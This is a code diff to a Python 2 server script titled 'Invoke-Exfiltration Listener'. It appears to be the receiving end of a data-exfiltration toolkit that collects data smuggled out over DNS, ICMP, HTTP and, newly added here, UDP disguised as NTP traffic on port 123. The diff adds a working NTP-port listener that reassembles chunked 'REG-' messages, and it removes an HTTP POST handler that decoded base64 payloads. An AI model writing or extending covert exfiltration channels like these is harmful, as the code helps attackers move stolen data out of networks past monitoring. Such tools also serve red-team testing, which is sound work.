@@ -6,10 +6,7 @@ import argparse
 import sys
 import string
 import time
-import json
 import signal
-import struct
-import tempfile
 from random import randint
 from os import listdir
 from os.path import isfile, join
@@ -18,13 +15,12 @@ from zlib import compress, decompress
 
 # Plugins
 import logging
-import requests
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from dnslib import *
 from scapy import all as scapy
 import base64
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
-import urllib
+import socket
 
 KEY = ""
 MIN_TIME_SLEEP = 1
@@ -39,6 +35,7 @@ config = None
 app_exfiltrate = None
 domain = None
 port = None
+register = None
 buf = {}
 
 class Plugin:
@@ -52,6 +49,8 @@ class Plugin:
 	elif config == "http":
 	    port = int(prt)
 	    app.register_plugin('http', {'listen': self.http_listen})
+	elif config == "ntp":
+	    app.register_plugin('ntp', {'listen': self.ntp_listen})
 	else:
 	    domain = unicode(dm, "utf-8")
 	    app.register_plugin('dns', {'listen': self.dns_listen})
@@ -74,6 +73,49 @@ class Plugin:
     	app_exfiltrate.log_message(
             'info', "[dns] Waiting for DNS packets for domain {0}".format(domain))
     	scapy.sniff(filter="udp and port {}".format(int("53")), prn=self.handle_dns_packet)
+
+    def ntp_listen(self):
+	global register
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	p = 123
+	try:
+            server_address = ('', p)
+            sock.bind(server_address)
+            app_exfiltrate.log_message(
+        	'info', "[udp] Starting server on port {}...".format(p))
+	except socket.error as e:
+            app_exfiltrate.log_message(
+        	'warning', "[udp] Couldn't bind on port {}...".format(p))
+            sys.exit(-1)
+
+	while True:
+            app_exfiltrate.log_message('info', "[udp] Waiting for connections...")
+            try:
+            	while True:
+                    data, client_address = sock.recvfrom(65535)
+                    app_exfiltrate.log_message(
+                    	'info', "[udp] client connected: {}".format(client_address))
+                    if data:
+                    	app_exfiltrate.log_message(
+                            'info', "[udp] Received {} bytes".format(len(data)))
+                    	try:
+			    if "REG-" in data:
+				if "REGISTER" in data:
+				    register = data.replace("REG-","")
+				else:
+				    register = register + data.replace("REG-","")
+				    register = filter(lambda x: x in string.printable, register)
+				    app_exfiltrate.retrieve_data(register) 
+			    else:
+				data = filter(lambda x: x in string.printable, data)
+			    	app_exfiltrate.retrieve_data(data)
+                    	except Exception, e:
+                            app_exfiltrate.log_message(
+                            	'warning', "[udp] Failed decoding message {}".format(e))
+                    else:
+                    	break
+            finally:
+            	pass
 
     def icmp_analyze(self, packet):
     	src = packet.payload.src
@@ -111,19 +153,6 @@ class S(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
-
-    def do_POST(self):
-        self._set_headers()
-        content_len = int(self.headers.getheader('content-length', 0))
-        post_body = self.rfile.read(content_len)
-        tmp = post_body.split('=')
-        if (tmp[0] == "data"):
-            try:
-                data = base64.b64decode(urllib.unquote(tmp[1]))
-                app_exfiltrate.retrieve_data(data)
-            except Exception, e:
-                print e
-                pass
 
     def do_GET(self):
         string = '/'.join(self.path.split('/')[1:])
@@ -226,12 +255,7 @@ class Exfiltration(object):
         # Load plugins
         sys.path.insert(0, path)
 	for fname in results.type.split(','):
-	    #if fname == 'http':
 	    plugins[fname] = Plugin(self, fname, results.port, results.domain)
-	    #elif fname == 'dns':
-		#plugins[fname] = Plugin(self, fname, results.port, results.domain)
-	    #else:
-		#plugins[fname] = Plugin(self, fname, results.port, results.domain)
 
     def register_plugin(self, transport_method, functions):
 	self.plugins[transport_method] = functions
@@ -326,8 +350,6 @@ def main():
 
     parser = argparse.ArgumentParser(
         description='Invoke-Exfiltration Listener')
-    parser.add_argument('-L', action="store_true",
-                        dest="listen", default=True, help="Server mode")
     parser.add_argument('-k', action="store", dest="key", default=None,
                         help="AES Key to use (eg. 'THEKEY')")
     parser.add_argument('-t', action="store", dest="type", default=None,
